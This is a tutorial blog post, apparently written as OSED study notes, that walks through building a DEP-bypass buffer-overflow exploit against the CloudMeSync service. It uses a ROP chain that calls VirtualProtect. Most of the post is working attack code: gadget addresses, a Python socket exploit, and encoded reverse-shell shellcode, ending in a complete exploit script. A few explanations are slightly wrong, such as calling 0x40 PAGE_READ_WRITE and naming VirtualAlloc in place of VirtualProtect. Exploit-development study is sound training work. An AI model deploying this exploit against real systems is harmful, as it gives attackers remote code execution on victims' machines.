---
title: "Buffer Overflow - DEP Bypass - VirtualProtect"
categories: [Buffer Overflow, OSED]
tags: [Windows,OSED,Buffer]
mermaid: true
image: https://0x4rt3mis.github.io/assets/img/osed/2023-01-31-Buffer%20Overflow-DEP/2023-01-31-Buffer%20Overflow%20-%20DEP%2012:01:26.png
---

In this section we will keep our studies in Buffer Overflow. Now using a different technique called Data Execution Prevention Bypass.

# CloudMeSync - VirtualProtect

Here we have the function of the VirtualProtect API, which we will use in this example right now.

```C
BOOL WINAPI VirtualProtect(          =>    A pointer to VirtualProtect()
  _In_   LPVOID lpAddress,           =>    Return Address (Redirect Execution to ESP)
  _In_   SIZE_T dwSize,              =>    dwSize up to you to chose as needed (0x1001)
  _In_   DWORD flNewProtect,         =>    flNewProtect (0x40)
  _Out_  PDWORD lpflOldProtect       =>    A writable pointer
);
```

And this is what we are going to put on the stack to be executed.

```
XXXXXXXX -> KERNEL32!VirtualProtectStub
YYYYYYYY -> Return Address (lpAddress)
YYYYYYYY -> lpAddress (return Address)
00001000 -> dwSize (Size of the Shellcode)
00000040 -> flNewProtect
WWWWWWWW -> lpflOldProtect (any writable address)
```

For our demonstration here we'll keep as our base the exploit 46250 from exploitdb. Check the [link](https://www.exploit-db.com/exploits/46250) here.

So, we'll use the this template from the exploitdb as our exploit.

```py
# 0x4rt3mis
# DEP Bypass
import socket
import sys
from struct import pack

total = 2500

def create_rop_chain():
        rop_gadgets = [ ]
        return ''.join(pack('<L', _) for _ in rop_gadgets)

rop_chain = create_rop_chain()

payload = b'\x41' * 1052
payload += pack("<L", (0x6ab2223e))  # ret
payload += rop_chain
payload += b'\x90' * 10
	
target = b'127.0.0.1'

try:
	s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.connect((target,8888))
	s.send(payload)
except:
	print "Crashed!"
```

The first argument lpAddress is the address at which we want to change memory protections, dwSize is giving the size, flNewProtect is a mask for the new protections we want (0x40 = PAGE_EXECUTE_READWRITE) and lpflOldProtect must be a writeable address so the old protections can be stored.

# Checking Modules

First thing is to check what modules we can use. So we attach the CloudMeSync on Windbg and check the protections on the DLLs.

```
.load narly
!nmod
```

![](https://0x4rt3mis.github.io/assets/img/osed/2023-01-31-Buffer%20Overflow-DEP-VirtualProtect/2023-01-31-Buffer%20Overflow-DEP-VirtualProtect%2009:02:06.png)

We'll use all the modules that has no defenses enabled, that's important because if we use any gadget loaded from a module which has protections, it's not going to be executed, and we are going to have problems with it.

# Getting VirtualProtect Address

Now, we the dlls we can use in our box, we start to look for the VirtualAlloc API Address on the modules. We open the **Qt5Core.dll** on IDA64

And on Import Table we get the base address of the VirtuaAlloc. Even if we reboot the box, the address will be the same, so for us that's fine to use that.

![](https://0x4rt3mis.github.io/assets/img/osed/2023-01-31-Buffer%20Overflow-DEP-VirtualProtect/2023-01-31-Buffer%20Overflow-DEP-VirtualProtect%2002:23:58.png)

```
00000000690398A8		VirtualProtect	KERNEL32
```

With that got, let's start our ROP Chain.

# Building ROP Chain

We start with our exploit template. We put this on the stack to be more visual. We'll place these values and then change it dinamically.

1. Here will be the Address of the VirtualAlloc API
virtual_protect_placeholder = pack("<L", (0x45454545)) # KERNEL32!VirtuaProtect

2. Here we'll put our Return Address
virtual_protect_placeholder += pack("<L", (0x46464646)) # Shellcode Retrun Addres

3. Here we'll put our Return Address (again)
virtual_protect_placeholder += pack("<L", (0x47474747)) # Shellcode Address

4. Here is going to be the dwSize, which is equal to 00001000
virtual_protect_placeholder += pack("<L", (0x48484848)) # dwSize

5. flAllocationType - 00000040
virtual_protect_placeholder += pack("<L", (0x49494949)) # flNewProtect

6. Last one is the flProtect - Any writeble address
virtual_protect_placeholder += pack("<L", (0x51515151)) # lpflOldProtect

This is what we are going to work.

# Generating Gadgets

Now, let's generate the gadgets here. We'll use the scripts form [EPI052](https://github.com/epi052/osed-scripts)

I did not tested the bad chars of the application because this is not the main point here, so the bad chars are 0x00 and 0x20.

```sh
find-gadgets.py -f libgcc_s_dw2-1.dll  libstdc++-6.dll  libwinpthread-1.dll  Qt5Core.dll  Qt5Gui.dll  Qt5Network.dll  Qt5Sql.dll Qt5Xml.dll  qwindows.dll -b 00 20 -a x86 -o rop.txt
```

After that it generates all the usable gadgets to us. So, we can now start digging into that and seeing what can be useful for us.

With this huge list of gadgets, should be easy for us to perform the bypass.

![](https://0x4rt3mis.github.io/assets/img/osed/2023-01-31-Buffer%20Overflow-DEP-VirtualProtect/2023-01-31-Buffer%20Overflow-DEP-VirtualProtect%2009:07:13.png)

# Sending the First Payload

We see that on the place of the EIP, we put a simple RET instruction in that. That is because we want to return to stack (ESP), near to the values we put to change.

We put a breakpoint on **0x6ab2223e** which is our RET instruction and then execute the payload

We see that when we reach the breakpoint, 20 bytes before our ESP we have set our fake addresses that will be changed. So we are on the right track.

![](https://0x4rt3mis.github.io/assets/img/osed/2023-01-31-Buffer%20Overflow-DEP/2023-01-31-Buffer%20Overflow%20-%20DEP%2001:49:55.png)

When we execute the RET instruction, we go to there, where ours NOPs are seted.

![](https://0x4rt3mis.github.io/assets/img/osed/2023-01-31-Buffer%20Overflow-DEP/2023-01-31-Buffer%20Overflow%20-%20DEP%2001:50:43.png)

What we must look here. If we see this point, even after the instruction that we executed, the 20 bytes before ESP still contains our fake values.

![](https://0x4rt3mis.github.io/assets/img/osed/2023-01-31-Buffer%20Overflow-DEP/2023-01-31-Buffer%20Overflow-DEP%2007:13:42.png)

Here we have the fist PoC

```py
# 0x4rt3mis
# DEP Bypass
import socket
import sys
from struct import pack

total = 2500

virtual_protect_placeholder = pack("<L", (0x45454545)) # KERNEL32!VirtuaProtect
virtual_protect_placeholder += pack("<L", (0x46464646)) # Shellcode Return Addres
virtual_protect_placeholder += pack("<L", (0x47474747)) # Shellcode Address
virtual_protect_placeholder += pack("<L", (0x48484848)) # dwSize
virtual_protect_placeholder += pack("<L", (0x49494949)) # flNewProtect
virtual_protect_placeholder += pack("<L", (0x51515151)) # lpflOldProtect

def create_rop_chain():
        rop_gadgets = [ ]
        return ''.join(pack('<L', _) for _ in rop_gadgets)

rop_chain = create_rop_chain()

payload = b'\x41' * (1052 - len(virtual_protect_placeholder))
payload += virtual_protect_placeholder
payload += pack("<L", (0x6ab2223e))  # ret
payload += rop_chain
payload += b'\x90' * 10
	
target = b'127.0.0.1'

try:
	s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.connect((target,8888))
	s.send(payload)
except:
	print "Crashed!"
```

# Copying ESP

Now, knowing that, we have a proper place to set our values to execute the VirtualProtect API and change the desired memory area to execute code inside it.

We'll get a copy of ESP into ECX (or any other Register) and the decrease 20 bytes in it. That's because we want to have ECX as our place where we'll put the values to make it working. So the gadget sequence we'll use here now will be this.

Why ECX? 

Because we wanto to use this write-what gadget. This is important to define before starting digging deeper in the ROP chain.

What it means?

We will place the addresses on EAX, and then write-what it on ECX, as a pointer

```
0x6aaa04ec  # mov dword ptr [ecx], eax; ret;  :: qwindows.dll                         
```

Só let's make our ESP copy. The gadgets we'll use will be this one.

```py
##############
# -> Make ESP equal to ECX (-20)
##############
## Put ESP on EBX
0x6aaf2fd3,  # push esp; pop ebx; pop esi; ret;
0x3333333, # junk to populate ESI
## Change EBX with EAX
0x68aad07c,  # xchg eax, ebx; ret;
## Change EAX wih ECX
0x68be726b,  # xchg eax, ecx; ret;
## Put -20 in EBP and ADD it in ECX
0x6aa812c9,  # pop ebp; ret;
0xffffffe0, # -20
0x6d9c8e42,  # add ecx, ebp; ret;
```

And here we got a copy of ESP into ECX,

![](https://0x4rt3mis.github.io/assets/img/osed/2023-01-31-Buffer%20Overflow-DEP-VirtualProtect/esp-ecx.gif)

# Patch VirtualProtect

Now, our next step is to patch the VirtuaProtect Address on the Place of 0x45454545.

We'll make use of three gadgets here, one to POP it's value in any register, one to make it a POINTER, and one to write-what it on ECX.

```py
##############
# -> PUT VirtualProtect in 0x45454545
##############
## Put VirtualProtect Addres in EAX
0x68ae7ee3,  # pop eax; ret;
0x690398A8, # VirtualProtect Address
## Make it a Pointer
0x6fe58ce5,  # mov eax, dword ptr [eax]; ret;
## Write it on ECX
0x6aaa04ec,  # mov dword ptr [ecx], eax; ret;
```

![](https://0x4rt3mis.github.io/assets/img/osed/2023-01-31-Buffer%20Overflow-DEP-VirtualProtect/virtual-0x45.gif)

Okay, now let's continue

# Patch Shellcode Return Address and Shellcode Address

Now, let's patch the 0x46464646 and 0x47474747. For that we must know where we'll put our shellcode.

We don't know exactly where we'll put there, right now. We can suppos that it's going to be 320 bytes over ECX. So we will make a copy of ECX to EAX, and the add 320 bytes in it.

Here we cannot use +320, because it contains nullbytes, so will use -320 and then NEG its to become 320.

```
0:000> ?320
Evaluate expression: 800 = 00000320
0:000> ?0x0 - 320
Evaluate expression: -800 = fffffce0
```

Here is the gadgets we'll use

```py
##############
# -> Patch Return Address in 0x46464646 and 0x47474747
##############
## INC 4 ECX, ALIGN STACK
0x61b474f8,  # inc ecx; ret;
0x61b474f8,  # inc ecx; ret;
0x61b474f8,  # inc ecx; ret;
0x61b474f8,  # inc ecx; ret;
## PUT -320 IN EDX
0x61e30fe3,  # pop edx; ret;
0xfffffce0, # -320
## NEG EDX TO BECOME +320
0x6eb47012,  # neg edx; ret;
## COPY ECX IN EAX
0x6ab445f9,  # mov eax, ecx; ret;
## ADD THE 320 IN EAX
0x6ab00690,  # add eax, edx; ret;
## WRITE EAX IN ECX (0x46464646)
0x6aaa04ec,  # mov dword ptr [ecx], eax; ret;
## INC 4 INC, ALIGN STACK
0x61b474f8,  # inc ecx; ret;
0x61b474f8,  # inc ecx; ret;
0x61b474f8,  # inc ecx; ret;
0x61b474f8,  # inc ecx; ret;
## WRITE EAX IN ECX (0x47474747)
0x6aaa04ec,  # mov dword ptr [ecx], eax; ret;
```

![](https://0x4rt3mis.github.io/assets/img/osed/2023-01-31-Buffer%20Overflow-DEP-VirtualProtect/address-0x46-0x47.gif)

Now that we already now the place we'll put our shellcode, let's continue.

# Patch dwSize

```C
BOOL WINAPI VirtualProtect(          =>    A pointer to VirtualProtect()
  _In_   LPVOID lpAddress,           =>    Return Address (Redirect Execution to ESP)
  _In_   SIZE_T dwSize,              =>    dwSize up to you to chose as needed (0x1001)
  _In_   DWORD flNewProtect,         =>    flNewProtect (0x40)
  _Out_  PDWORD lpflOldProtect       =>    A writable pointer
);
```

Now, let's patch the dwSize, which in this case, must be lenght of the memory area we need, **here is differente than VirtualAlloc API**, have that in mind and read the documentation, let's put 1001. We'll now use 0x1000 because it contains Null Bytes even on the neg form.

```
0:000> ?0x1000
Evaluate expression: 4096 = 00001000
0:000> ?0x1001
Evaluate expression: 4097 = 00001001
0:000> ?0x0 - 0x1000
Evaluate expression: -4096 = fffff000
0:000> ?0x0 - 0x1001
Evaluate expression: -4097 = ffffefff
```

```py
## INC 4 INC, ALIGN STACK
0x61b474f8,  # inc ecx; ret;
0x61b474f8,  # inc ecx; ret;
0x61b474f8,  # inc ecx; ret;
0x61b474f8,  # inc ecx; ret;
## POP -1001 IN EAX
0x64b4fa38,  # pop eax; ret;
0xffffefff,  # -1001
## NEG -1001, TO BECOME 1001
0x68cef5b2,  # neg eax; ret;
## WRITE EAX IN ECX (0x48484848)
0x6aaa04ec,  # mov dword ptr [ecx], eax; ret;
```

![](https://0x4rt3mis.github.io/assets/img/osed/2023-01-31-Buffer%20Overflow-DEP-VirtualProtect/dwsize-0x48.gif)

Okay, now let's go to the flNewProtect.

# Patch flNewProtect

It must be 0x40, because it's the new memory property, which is PAGE_READ_WRITE.

It's going to be almost the same than before, the only diference is that is going to be 0x40 not 0x10001

```
0:000> ?0x40
Evaluate expression: 64 = 00000040
0:000> ?0x0 - 0x40
Evaluate expression: -64 = ffffffc0
```

```py
## INC 4 INC, ALIGN STACK
0x61b474f8,  # inc ecx; ret;
0x61b474f8,  # inc ecx; ret;
0x61b474f8,  # inc ecx; ret;
0x61b474f8,  # inc ecx; ret;
## POP -40 IN EAX
0x64b4fa38,  # pop eax; ret;
0xffffffc0,  # -40
## NEG -40, TO BECOME 40
0x68cef5b2,  # neg eax; ret;
## WRITE EAX IN ECX (0x49494949)
0x6aaa04ec,  # mov dword ptr [ecx], eax; ret;
```

![](https://0x4rt3mis.github.io/assets/img/osed/2023-01-31-Buffer%20Overflow-DEP-VirtualProtect/flnew-0x49.gif)

Okay, now let's patch the last one, which is the lpflOldProtect

# Patch lpflOldProtect

Now we need to use a PAGE_READWRITE address to store our old permission.

We'll use the ECX as a base and add some bytes in it.

```py
##############
# -> Patch lpflOldProtect 0x51515151
##############
## Put ECX on EAX
0x61ba4ca0,  # mov eax, ecx; ret;
## Put -20 in ESI and ADD it in EAX
0x61e30fe3,  # pop edx; ret;
0xffffffe0,  # -20
0x6eb47012,  # neg edx; ret;
0x6ab00690,  # add eax, edx; ret;
0x6aaa04ec,  # mov dword ptr [ecx], eax; ret;
```

Done, we used the values of ECX + 20, we put the 20 because we don't want to mess up with our gadgets and with our shellcode.

![](https://0x4rt3mis.github.io/assets/img/osed/2023-01-31-Buffer%20Overflow-DEP-VirtualProtect/flold-0x51.gif)

# ECX to ESP

Now, just put the value of ECX, which has our API, in the ESP value. We return 20 bytes because it's here the API CALL starts.

```py
##############
# -> ECX to ESP
##############
## PUT -20 on EBP
0x6aa812c9,  # pop ebp; ret;
0xffffffec,  # -20
## DEC ECX in 20
0x6d9c8e42,  # add ecx, ebp; ret;
## PUT ECX, on ESP
0x6eb53647,  # mov esp, ecx; ret;
```

And after we execute the gadgets, we found that the protection of the desired area was changed! We have done it!

```
Protect:           00000040  PAGE_EXECUTE_READWRITE
```

![](https://0x4rt3mis.github.io/assets/img/osed/2023-01-31-Buffer%20Overflow-DEP-VirtualProtect/ecx-esp.gif)

# Reverse Shell

Now, just add our reverse shell in it, we have the PoC here

```py
shellcode =  b""
shellcode += b"\xda\xdd\xd9\x74\x24\xf4\x5d\x31\xc9\xb1\x5e"
shellcode += b"\xbf\x85\xf0\x6d\xbf\x83\xed\xfc\x31\x7d\x15"
shellcode += b"\x03\x7d\x15\x67\x05\xe4\x5a\xe6\x22\x07\x5d"
shellcode += b"\x17\x55\xd9\x57\x83\x21\x6b\x58\xc0\x40\x80"
shellcode += b"\x13\xa0\xb0\x13\x7d\x44\x42\x5d\xa2\xdf\x62"
shellcode += b"\xc4\x9b\x90\x92\x7d\x2e\xc5\xa5\x23\x47\x6c"
shellcode += b"\xae\x30\x03\x66\x5b\x39\x53\x89\xc4\x4d\xef"
shellcode += b"\x49\x8e\x2e\xf3\xc9\x91\x11\x78\x66\x8a\x26"
shellcode += b"\x38\x58\xab\xe0\x4e\xdd\x57\xf3\x67\x94\x2c"
shellcode += b"\xb1\x7b\xad\x07\xb2\x85\x6f\x56\x02\x1c\x73"
shellcode += b"\x35\x06\xdf\xff\x41\xc6\x2a\xf2\x4c\x0a\x41"
shellcode += b"\xf8\x74\xde\xb2\x24\xfe\x01\x31\x73\x24\xbf"
shellcode += b"\x9c\x1d\xaf\xb3\x6a\x6a\xf8\xd7\x6b\xb6\x8c"
shellcode += b"\xec\xe1\x47\x4b\x65\xb1\x63\x77\x17\xf9\x03"
shellcode += b"\x04\x6e\x48\xab\xf5\xc4\xb7\xc2\x4f\xf7\xdf"
shellcode += b"\x5a\x01\xf9\xf3\x9d\xcb\x01\x85\x24\xe0\x61"
shellcode += b"\xe7\x58\xbb\x64\xf8\xf1\xb8\x01\x43\xe1\xf1"
shellcode += b"\xd1\x2a\xa9\x9e\xbd\xe2\xa1\x6d\x0c\x2d\x55"
shellcode += b"\xfa\x07\x42\xa7\xa5\xb3\x5b\x92\x4d\xb5\x67"
shellcode += b"\x74\xa5\x28\x9b\xbf\xc6\xe6\x60\x36\x7d\x15"
shellcode += b"\x01\x91\x77\xd0\x7c\xde\xdd\x1e\xf6\x65\xfe"
shellcode += b"\x76\x04\xdf\xd3\x35\xeb\x4a\x28\xb3\x51\x50"
shellcode += b"\xb9\x23\x68\x51\xdf\x1a\x1b\x64\x09\x95\x4c"
shellcode += b"\x57\x89\x43\xd5\x95\x0b\xdc\xda\xcc\x17\xed"
shellcode += b"\xe4\xbe\x77\x5d\x55\x38\x28\x71\x90\x14\x88"
shellcode += b"\xd9\x65\xc1\x28\x53\x5f\xd8\xe8\x33\x30\x72"
shellcode += b"\x29\x1b\xca\x4e\xcf\xe4\x2a\xf5\xd1\xf5\x3d"
shellcode += b"\x6f\x51\x35\x3f\x3f\x01\xe9\x71\x7f\xf9\x45"
shellcode += b"\x22\x2f\xfe\x75\x92\x98\xa8\x8a\x47\x02\x03"
shellcode += b"\x23\x3e\x7b\x6b\x9b\xee\xcb\xeb\x2d\xc6\x9a"
shellcode += b"\x6c\x4c\x10\x8c\x5d\x8f\xf0\x7c\xce\x5f\xa1"
shellcode += b"\x2c\xbe\x0f\x11\x9c\x8e\xf4\xc1\x48\xb0\x4c"
shellcode += b"\x7a\xf7\xd4\x52\x8a\x2f\xb8\xc4\x16\xa2\x5d"
shellcode += b"\x3b\x8d\x67\x17\xa3\x1c\x5e\x41\x9d\xcf\x63"
shellcode += b"\xa7\x15\xbf\x34\x86\x65\x10\xea\xb8\x25\xc1"
shellcode += b"\x42\x69\xf6\xb2\x02\x76\xa3\x2c\x93\x41\x1d"
shellcode += b"\x27\x2c\xae\xcb\xa7"
```

And here we have the reverse shell

![](https://0x4rt3mis.github.io/assets/img/osed/2023-01-31-Buffer%20Overflow-DEP-VirtualProtect/2023-01-31-Buffer%20Overflow-DEP-VirtualProtect%2012:10:52.png)

```py
# 0x4rt3mis
# DEP Bypass
import socket
import sys
from struct import pack

total = 2500

shellcode =  b""
shellcode += b"\xda\xdd\xd9\x74\x24\xf4\x5d\x31\xc9\xb1\x5e"
shellcode += b"\xbf\x85\xf0\x6d\xbf\x83\xed\xfc\x31\x7d\x15"
shellcode += b"\x03\x7d\x15\x67\x05\xe4\x5a\xe6\x22\x07\x5d"
shellcode += b"\x17\x55\xd9\x57\x83\x21\x6b\x58\xc0\x40\x80"
shellcode += b"\x13\xa0\xb0\x13\x7d\x44\x42\x5d\xa2\xdf\x62"
shellcode += b"\xc4\x9b\x90\x92\x7d\x2e\xc5\xa5\x23\x47\x6c"
shellcode += b"\xae\x30\x03\x66\x5b\x39\x53\x89\xc4\x4d\xef"
shellcode += b"\x49\x8e\x2e\xf3\xc9\x91\x11\x78\x66\x8a\x26"
shellcode += b"\x38\x58\xab\xe0\x4e\xdd\x57\xf3\x67\x94\x2c"
shellcode += b"\xb1\x7b\xad\x07\xb2\x85\x6f\x56\x02\x1c\x73"
shellcode += b"\x35\x06\xdf\xff\x41\xc6\x2a\xf2\x4c\x0a\x41"
shellcode += b"\xf8\x74\xde\xb2\x24\xfe\x01\x31\x73\x24\xbf"
shellcode += b"\x9c\x1d\xaf\xb3\x6a\x6a\xf8\xd7\x6b\xb6\x8c"
shellcode += b"\xec\xe1\x47\x4b\x65\xb1\x63\x77\x17\xf9\x03"
shellcode += b"\x04\x6e\x48\xab\xf5\xc4\xb7\xc2\x4f\xf7\xdf"
shellcode += b"\x5a\x01\xf9\xf3\x9d\xcb\x01\x85\x24\xe0\x61"
shellcode += b"\xe7\x58\xbb\x64\xf8\xf1\xb8\x01\x43\xe1\xf1"
shellcode += b"\xd1\x2a\xa9\x9e\xbd\xe2\xa1\x6d\x0c\x2d\x55"
shellcode += b"\xfa\x07\x42\xa7\xa5\xb3\x5b\x92\x4d\xb5\x67"
shellcode += b"\x74\xa5\x28\x9b\xbf\xc6\xe6\x60\x36\x7d\x15"
shellcode += b"\x01\x91\x77\xd0\x7c\xde\xdd\x1e\xf6\x65\xfe"
shellcode += b"\x76\x04\xdf\xd3\x35\xeb\x4a\x28\xb3\x51\x50"
shellcode += b"\xb9\x23\x68\x51\xdf\x1a\x1b\x64\x09\x95\x4c"
shellcode += b"\x57\x89\x43\xd5\x95\x0b\xdc\xda\xcc\x17\xed"
shellcode += b"\xe4\xbe\x77\x5d\x55\x38\x28\x71\x90\x14\x88"
shellcode += b"\xd9\x65\xc1\x28\x53\x5f\xd8\xe8\x33\x30\x72"
shellcode += b"\x29\x1b\xca\x4e\xcf\xe4\x2a\xf5\xd1\xf5\x3d"
shellcode += b"\x6f\x51\x35\x3f\x3f\x01\xe9\x71\x7f\xf9\x45"
shellcode += b"\x22\x2f\xfe\x75\x92\x98\xa8\x8a\x47\x02\x03"
shellcode += b"\x23\x3e\x7b\x6b\x9b\xee\xcb\xeb\x2d\xc6\x9a"
shellcode += b"\x6c\x4c\x10\x8c\x5d\x8f\xf0\x7c\xce\x5f\xa1"
shellcode += b"\x2c\xbe\x0f\x11\x9c\x8e\xf4\xc1\x48\xb0\x4c"
shellcode += b"\x7a\xf7\xd4\x52\x8a\x2f\xb8\xc4\x16\xa2\x5d"
shellcode += b"\x3b\x8d\x67\x17\xa3\x1c\x5e\x41\x9d\xcf\x63"
shellcode += b"\xa7\x15\xbf\x34\x86\x65\x10\xea\xb8\x25\xc1"
shellcode += b"\x42\x69\xf6\xb2\x02\x76\xa3\x2c\x93\x41\x1d"
shellcode += b"\x27\x2c\xae\xcb\xa7"

virtual_protect_placeholder = pack("<L", (0x45454545)) # KERNEL32!VirtuaProtect
virtual_protect_placeholder += pack("<L", (0x46464646)) # Shellcode Return Addres
virtual_protect_placeholder += pack("<L", (0x47474747)) # Shellcode Address
virtual_protect_placeholder += pack("<L", (0x48484848)) # dwSize
virtual_protect_placeholder += pack("<L", (0x49494949)) # flNewProtect
virtual_protect_placeholder += pack("<L", (0x51515151)) # lpflOldProtect

def create_rop_chain():
        rop_gadgets = [
                ##############
                # -> Make ESP equal to ECX (-20)
                ##############
                ## Put ESP on EBX
                0x6aaf2fd3,  # push esp; pop ebx; pop esi; ret;
                0x3333333, # junk to populate ESI
                ## Change EBX with EAX
                0x68aad07c,  # xchg eax, ebx; ret;
                ## Change EAX wih ECX
                0x68be726b,  # xchg eax, ecx; ret;
                ## Put -20 in EBP and ADD it in ECX
                0x6aa812c9,  # pop ebp; ret;
                0xffffffe0, # -20
                0x6d9c8e42,  # add ecx, ebp; ret;

                ##############
                # -> PUT VirtualProtect in 0x45454545
                ##############
                ## Put VirtualProtect Addres in EAX
                0x68ae7ee3,  # pop eax; ret;
                0x690398A8, # VirtualProtect Address
                ## Make it a Pointer
                0x6fe58ce5,  # mov eax, dword ptr [eax]; ret;
                ## Write it on ECX
                0x6aaa04ec,  # mov dword ptr [ecx], eax; ret;

                ##############
                # -> Patch Return Address in 0x46464646 and 0x47474747
                ##############
                ## INC 4 ECX, ALIGN STACK
                0x61b474f8,  # inc ecx; ret;
                0x61b474f8,  # inc ecx; ret;
                0x61b474f8,  # inc ecx; ret;
                0x61b474f8,  # inc ecx; ret;
                ## PUT -320 IN EDX
                0x61e30fe3,  # pop edx; ret;
                0xfffffce0, # -320
                ## NEG EDX TO BECOME +320
                0x6eb47012,  # neg edx; ret;
                ## COPY ECX IN EAX
                0x6ab445f9,  # mov eax, ecx; ret;
                ## ADD THE 320 IN EAX
                0x6ab00690,  # add eax, edx; ret;
                ## WRITE EAX IN ECX (0x46464646)
                0x6aaa04ec,  # mov dword ptr [ecx], eax; ret;
                ## INC 4 INC, ALIGN STACK
                0x61b474f8,  # inc ecx; ret;
                0x61b474f8,  # inc ecx; ret;
                0x61b474f8,  # inc ecx; ret;
                0x61b474f8,  # inc ecx; ret;
                ## WRITE EAX IN ECX (0x47474747)
                0x6aaa04ec,  # mov dword ptr [ecx], eax; ret;

                ##############
                # -> Patch dwSize - 0x1001 - 0x48484848
                ##############
                ## INC 4 INC, ALIGN STACK
                0x61b474f8,  # inc ecx; ret;
                0x61b474f8,  # inc ecx; ret;
                0x61b474f8,  # inc ecx; ret;
                0x61b474f8,  # inc ecx; ret;
                ## POP -1001 IN EAX
                0x64b4fa38,  # pop eax; ret;
                0xffffefff,  # -1001
                ## NEG -1001, TO BECOME 1001
                0x68cef5b2,  # neg eax; ret;
                ## WRITE EAX IN ECX (0x48484848)
                0x6aaa04ec,  # mov dword ptr [ecx], eax; ret;

                ##############
                # -> Patch flNewProtect - 0x40 - 0x49494949
                ##############
                ## INC 4 INC, ALIGN STACK
                0x61b474f8,  # inc ecx; ret;
                0x61b474f8,  # inc ecx; ret;
                0x61b474f8,  # inc ecx; ret;
                0x61b474f8,  # inc ecx; ret;
                ## POP -40 IN EAX
                0x64b4fa38,  # pop eax; ret;
                0xffffffc0,  # -40
                ## NEG -40, TO BECOME 40
                0x68cef5b2,  # neg eax; ret;
                ## WRITE EAX IN ECX (0x49494949)
                0x6aaa04ec,  # mov dword ptr [ecx], eax; ret;

                ##############
                # -> Patch lpflOldProtect 0x51515151
                ##############
                ## INC 4 INC, ALIGN STACK
                0x61b474f8,  # inc ecx; ret;
                0x61b474f8,  # inc ecx; ret;
                0x61b474f8,  # inc ecx; ret;
                0x61b474f8,  # inc ecx; ret;
                ## Put ECX on EAX
                0x61ba4ca0,  # mov eax, ecx; ret;
                ## Put -20 in ESI and ADD it in EAX
                0x61e30fe3,  # pop edx; ret;
                0xffffffe0,  # -20
                0x6eb47012,  # neg edx; ret;
                0x6ab00690,  # add eax, edx; ret;
                0x6aaa04ec,  # mov dword ptr [ecx], eax; ret;

                ##############
                # -> ECX to ESP
                ##############
                ## PUT -20 on EBP
                0x6aa812c9,  # pop ebp; ret;
                0xffffffec,  # -20
                ## DEC ECX in 20
                0x6d9c8e42,  # add ecx, ebp; ret;
                ## PUT ECX, on ESP
                0x6eb53647,  # mov esp, ecx; ret;
                
                        ]
        return ''.join(pack('<L', _) for _ in rop_gadgets)

rop_chain = create_rop_chain()

payload = b'\x41' * (1052 - len(virtual_protect_placeholder))
payload += virtual_protect_placeholder
payload += pack("<L", (0x6ab2223e))  # ret
payload += rop_chain
payload += b'\x90' * 900
payload += shellcode
	
target = b'127.0.0.1'

try:
	s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.connect((target,8888))
	s.send(payload)
except:
	print "Crashed!"
```